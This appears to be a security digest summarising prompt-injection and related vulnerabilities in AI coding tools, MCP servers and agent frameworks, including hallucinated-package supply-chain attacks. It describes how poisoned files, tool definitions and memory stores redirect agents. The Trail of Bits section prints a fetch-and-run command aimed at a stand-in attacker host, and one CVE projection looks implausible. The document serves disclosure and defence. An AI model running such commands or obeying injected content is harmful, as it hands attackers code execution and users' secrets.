## Incidents & Vulnerabilities

### IDEsaster — Universal Vulnerability Class Across AI IDEs

**Researcher:** Ari Marzouk | **Disclosed:** December 2025 | **Status:** Partially patched; 24 CVEs assigned

Security researcher Ari Marzouk documented 30+ vulnerabilities across 10+ AI coding tools under the name **IDEsaster**. 100% of tested AI IDEs were vulnerable via a shared three-stage attack chain: **Prompt Injection → Agent Tools → Base IDE Features**. Estimated 1.8 million developers at risk. Attack vectors include malicious `.cursorrules` files, hidden Unicode in user-pasted content, malicious MCP servers, repository README files, and deeplinks.

Affected tools: GitHub Copilot, Cursor, Windsurf, Kiro.dev, Zed.dev, Roo Code, JetBrains Junie, Cline, Gemini CLI, Claude Code.

### Claude Code — RCE & API Token Exfiltration

**Researcher:** Check Point Research | **Disclosed:** February 25, 2026 | **Status:** Patched in Claude Code 2.0.65+

- **CVE-2025-59536** (CVSS 8.7): Exploits the Hooks feature — predefined shell commands in `.claude/settings.json` that fire at lifecycle events. A malicious Hook in a cloned repository executes before the trust dialog appears. A companion flaw allows `.mcp.json` inside a repo to override MCP consent settings and auto-approve all MCP servers.
- **CVE-2026-21852**: Additional configuration injection paths including environment variable exfiltration.

Chained mcp-server-git vulnerabilities (disclosed July 2025, patched January 2026):

- **CVE-2025-68145**: Path validation bypass
- **CVE-2025-68143**: Unrestricted `git_init` can convert `.ssh/` into a git repo
- **CVE-2025-68144**: Argument injection in `git_diff`

These three chained with the Filesystem MCP server achieve full RCE via malicious `.git/config` files.

Source: [Check Point Research](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)

### Cursor — MCPoison & CurXecute

**Status:** Patched in Cursor v1.3 and v1.7

- **CVE-2025-54136 ("MCPoison")**: MCP trust boundary bypass. Once an MCP extension is approved, it can be silently modified post-approval without further user interaction, enabling persistent silent RCE.
- **CVE-2025-54135 ("CurXecute", CVSS 8.6)**: Prompt injection via a poisoned MCP server fetching untrusted external data. Achieves full RCE under user privileges.
- **CVE-2025-59944**: Case-sensitivity bypass — `.CURSOR/mcp.json` (uppercase) persists malicious MCP configs across IDE restarts, surviving the lowercase-path patch. Patched in v1.7.

Sources: [Pillar Security](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents) | [Cybersecurity News](https://cybersecuritynews.com/critical-vulnerabilities-in-github-copilot-gemini-cli-claude/)

### GitHub Copilot — RoguePilot & CamoLeak

**Status:** Multiple CVEs; several patched

- **RoguePilot** (disclosed March 2026): Exploits Copilot's Codespaces integration via prompt injection in repository README files, capable of hijacking Copilot agent actions. Patch status: under review.
- **CamoLeak** (CVSS 9.6): Silent exfiltration of private repository code using invisible prompt injection through Copilot Chat's image proxying mechanism. Secret leakage rates 40% higher in Copilot-using repos (6.4% vs. 4.6% baseline). Patched.
- **CVE-2025-64660**: Multi-root workspace settings manipulation leading to RCE. Patched.
- **CVE-2025-53773**: Hidden Unicode characters hijack Copilot to overwrite `.vscode/settings.json`. Patched; GitHub added visible warnings for files containing hidden Unicode.

Trail of Bits (August 2025) separately demonstrated that prompt injection could trick Copilot into inserting a malicious backdoor into open-source code by filing a crafted GitHub Issue.

Sources: [Orca Security](https://orca.security/resources/blog/roguepilot-github-copilot-vulnerability/) | [Trail of Bits](https://blog.trailofbits.com/2025/08/06/prompt-injection-engineering-for-attackers-exploiting-github-copilot/)

### Amazon Q Developer & AWS Kiro IDE

**AWS Bulletin:** AWS-2025-019 | **Status:** Multiple patches July–August 2025; additional CVEs into 2026

Three prompt injection vulnerabilities found by Johann Rehberger ("Embrace The Red"):

1. **Amazon Q Developer — RCE**: Malicious files trigger `find`/`grep`/`echo` with invisible control characters, bypassing HITL. Patched in Language Server v1.22.0 (July 17, 2025).
2. **Amazon Q Developer — DNS Exfiltration**: `ping`/`dig` commands exfiltrate secrets via DNS. Patched in v1.24.0 (July 29, 2025).
3. **Kiro — Arbitrary Code Execution**: MCP settings files manipulated to execute arbitrary code in Autopilot mode. Patched in Kiro v0.1.42 (August 1, 2025).

Additional Kiro CVEs:

- **CVE-2026-0830**: Command injection in Kiro's GitLab Merge Request Helper via `child_process.exec` string interpolation. A maliciously named repository folder triggers arbitrary command injection. Fixed in v0.6.18.
- **CVE-2026-4295**: Arbitrary code execution when opening a maliciously crafted project directory. Fixed in v0.8.0.

Sources: [AWS-2025-019](https://aws.amazon.com/security/security-bulletins/AWS-2025-019/) | [AWS 2026-009](https://aws.amazon.com/security/security-bulletins/2026-009-AWS/)

### Microsoft Copilot — EchoLeak, Reprompt, Excel Agent XSS

**Status:** All three patched

- **CVE-2025-32711 ("EchoLeak")**: Zero-click attack on Microsoft 365 Copilot enterprise. No user interaction required; automatically exfiltrates data from targeted organizations. Microsoft classified Critical; server-side patch applied.
- **Reprompt** (patched January 13, 2026): Uses Parameter 2 Prompt injection with double-request chaining to continuously exfiltrate data invisibly from Microsoft Copilot Personal. Bypasses client-side monitoring. Reported August 2025 by Varonis.
- **CVE-2026-26144** (March 2026 Patch Tuesday): XSS in Microsoft Excel causing Copilot Agent mode to exfiltrate data via unintended network egress. No privileges or user interaction required. Rated Critical; patched.

Sources: [SecurityWeek EchoLeak](https://www.securityweek.com/echoleak-ai-attack-enabled-theft-of-sensitive-data-via-microsoft-365-copilot/) | [Varonis Reprompt](https://www.varonis.com/blog/reprompt)

### LangChain — CVE-2025-68664 ("LangGrinch")

**Researcher:** Yarden Porat | **Disclosed:** December 24, 2025 | **Status:** Patched | **CVSS:** 9.3 Critical

Serialization injection in `langchain-core`'s `dumps()`/`dumpd()` functions. Attacker-controlled data in LLM response fields (`additional_kwargs`, `response_metadata`) is treated as legitimate LangChain objects during deserialization. With `secrets_from_env=True` as default, this enables API key and token exfiltration in streaming operations. ~98 million monthly PyPI downloads.

Fixed in `langchain-core` 0.3.81 / 1.2.5. Companion **CVE-2025-68665** (CVSS 8.6) affects LangChain.js with the same root cause.

Source: [The Hacker News](https://thehackernews.com/2025/12/critical-langchain-core-vulnerability.html) | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-68664)

### Trail of Bits — Prompt Injection → Argument Injection → RCE

**Published:** October 2025 | **Status:** Ongoing disclosure

Trail of Bits documented a systematic attack pattern: **argument injection** bypasses HITL approval by exploiting pre-approved commands. Because agents expose broad command allowlists and do not validate argument flags, a single injected prompt chains into RCE:

- `go test -exec "curl attacker.com | bash"` — executes without HITL because `go test` is pre-approved
- `git show` + `ripgrep` — no argument restrictions, achieves RCE

Payloads work embedded in code comments, `.cursorrules`, GitHub content, and log output.

Source: [Trail of Bits Blog](https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/)

## Supply Chain

### Slopsquatting — AI Hallucinated Dependencies

**Status:** Confirmed real-world exploitation as of January 2026

Attackers register npm/PyPI package names that LLMs consistently hallucinate. Key statistics:

- ~20% of 576,000 generated Python/JavaScript code samples referenced nonexistent packages
- Open-source LLMs (CodeLlama, DeepSeek, WizardCoder) hallucinate at ~21.7%; commercial models (GPT-4) at ~5%
- 43% of hallucinated packages are **repeated across 10 independent queries** — hallucinations are targetable, not random
- When a hallucinated package is registered, post-install scripts typically steal API keys and cloud tokens from the environment

**Documented case:** Researcher Bar Lanyado registered `huggingface-cli` on PyPI. Within three months: 30,000+ downloads. Alibaba was found to have copy-pasted AI-generated docs referencing this hallucinated package into their public documentation.

**January 2026 incident:** Researcher Charlie Eriksen at Aikido found `react-codeshift` — a hallucinated package spreading through real AI agent infrastructure with agents attempting to install it autonomously.

Sources: [Bleeping Computer](https://www.bleepingcomputer.com/news/security/ai-hallucinated-code-dependencies-become-new-supply-chain-risk/) | [Aikido](https://www.aikido.dev/blog/slopsquatting-ai-package-hallucination-attacks) | [Trend Micro](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/slopsquatting-when-ai-agents-hallucinate-malicious-packages)

A `dockerBuildPath: ".."` traversal in `smithery.yaml` caused the Smithery MCP registry to build Docker images from the builder's home directory, leaking `~/.docker/config.json` — including a Fly.io API token granting control over 3,000+ hosted MCP servers.

## Research & Advisories

### MCP Ecosystem Security Survey

An analysis of 67,057 MCP servers across 6 public registries and targeted audits found:

- 43% of MCP servers have OAuth authentication flaws
- 43% contain command injection vulnerabilities
- 33% allow unrestricted network access
- 22% allow file access outside intended data sources
- 5% of open-source MCP servers actively seeded with tool poisoning

Additional specific CVEs:

| CVE | Component | CVSS | Status |
|---|---|---|---|
| CVE-2026-23744 | MCPJam Inspector ≤ v1.4.2 | 9.8 | Disclosed; no fix |
| CVE-2026-25536 | MCP TypeScript SDK | 7.1 | Patched v1.26.0 |
| CVE-2025-6514 | mcp-remote (OAuth proxy) | Critical | Disclosed by JFrog |

**Tool Poisoning / "Rug Pull":** MCP tools can silently mutate their definitions after user approval — a benign tool on Day 1 can redirect API keys to an attacker by Day 7. Traditional security tooling does not monitor changes to MCP tool descriptions.

**WhatsApp MCP Exfiltration:** Invariant Labs demonstrated that a malicious MCP server can silently exfiltrate a user's full WhatsApp history by combining tool poisoning with a co-resident `whatsapp-mcp` server.

**Anthropic MCP Inspector RCE:** The developer tool for testing MCP servers allowed unauthenticated RCE via the inspector-proxy architecture; a developer inspecting a malicious MCP server would execute attacker-controlled commands locally.

Sources: [Palo Alto Unit 42](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/) | [AuthZed Timeline](https://authzed.com/blog/timeline-mcp-breaches) | [vulnerablemcp.info](https://vulnerablemcp.info/) | [eSentire](https://www.esentire.com/blog/model-context-protocol-security-critical-vulnerabilities-every-ciso-should-address-in-2025)

### Persistent "Poisoned Memory" Attacks

A new attack class distinct from session-bound prompt injection: malicious instructions injected into an agent's **memory store** persist across sessions (sometimes days or weeks), enabling long-term footholds in developer workflows without ongoing access to the original attack vector. No CVE assigned; treated as an architectural vulnerability class.

Improper code generation control (CWE-94) in Microsoft Semantic Kernel, the enterprise AI orchestration framework. Part of a growing pattern of CVEs landing in the orchestration layer (retrieval, tools, filters, prompt pipelines) rather than only in end-user tools. Status: Disclosed.

## Key Structural Findings

1. **Prompt injection is the root cause of most RCE chains.** The path is consistently: malicious content in any agent-readable context → prompt injection → abuse of pre-approved agent tool → RCE.
2. **MCP has dramatically expanded the attack surface** by providing a standardized channel for arbitrary tool execution. 43% of servers have command injection vulnerabilities; 5% are actively seeded with tool poisoning.
3. **Supply chain attacks via hallucinated dependencies are confirmed real-world events** as of January 2026, no longer theoretical.
4. **Windsurf remains unpatched** — all reported vulnerabilities unaddressed since May 2025. Google's acquisition carries these forward.
5. **AI-related CVEs are accelerating** — nearly doubled year-over-year (168 to 330), with projections exceeding 50,000 total AI CVEs in 2026.
